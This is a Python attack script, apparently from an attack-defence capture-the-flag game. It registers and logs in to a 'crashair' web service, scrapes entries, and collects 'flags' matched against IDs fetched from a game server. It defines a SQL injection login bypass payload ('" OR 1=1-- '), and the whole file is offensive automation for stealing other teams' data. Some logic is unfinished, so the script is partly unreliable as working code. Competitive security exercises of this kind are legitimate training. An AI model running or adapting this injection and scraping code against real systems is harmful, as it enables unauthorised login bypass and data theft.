from typing import Iterable
from morel import logger
import requests
import json
import base64
from bs4 import BeautifulSoup

s = requests.Session()


def register(target_ip, username, password):
    res = s.post(
        f"http://{target_ip}:8000/register",
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0",
            "Referer": "http://{target_ip}:8000/",
        },
        data={"username": username, "password": password},
    )

    print(res.text)

    return res


def login(target_ip, username, password):
    res = s.post(
        f"http://{target_ip}:8000/login",
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:114.0) Gecko/20100101 Firefox/114.0",
            "Referer": "http://{target_ip}:8000/",
        },
        data={"username": username, "password": password},
    )

    return res


def bypass_login(target_ip, username):
    SQLi = '" OR 1=1-- '

    res = login(target_ip, username, SQLi)

    return res


def get_optionals(target_ip):
    res = s.get(f"http://{target_ip}:8000/optionals")

    soup = BeautifulSoup(res.text, "html.parser")
    table_rows = soup.select("table.table > tbody > tr")

    # print(res.text)
    # print(f"{table_rows = }")
    # print(f"{len(table_rows) = }")
    # print(f"{table_rows[0] = }")

    return table_rows


def get_targets(target_ip, service="crashair"):
    res = s.get(f"http://10.10.0.1:8081/flagIds?service={service}&team={target_ip}")
    targets = res.json()[service][target_ip]

    # target_dicts = []
    # for target in targets:
    #     # print(target)
    #     target_dict = json.loads(target)
    #     # print(target_dict["user1"])
    #     target_dicts.append(target_dict)

    return targets


def get_optional_id(optional):
    optional = str(optional)
    id = optional.split('">info</a></td>')[0].split("/")[-1]

    return id


def steal_user_flags(target_ip, user):
    # print(f"{bypass_login(target_ip, user).text=}")

    optionals = get_optionals(target_ip)
    optionals = [str(optional) for optional in optionals]

    return optionals


def main(target_ip: str) -> Iterable[str]:
    log = logger.bind(file=f"{__name__}.log")
    log.debug(f"{__name__} against {target_ip}")

    targets = get_targets(target_ip)
    log.debug(f"{targets = }")

    flags = []

    register(target_ip, "enzoxx", "enzoxx")
    login(target_ip, "enzoxx", "enzoxx")

    optionals = get_optionals(target_ip)

    for optional in optionals:
        optional_id = get_optional_id(optional)
        log.debug(f"{optional_id = }")

        if optional_id in targets:
            values = optional.find_all("td")
            author = values[0].text

            flags += steal_user_flags(target_ip, author)

    return flags
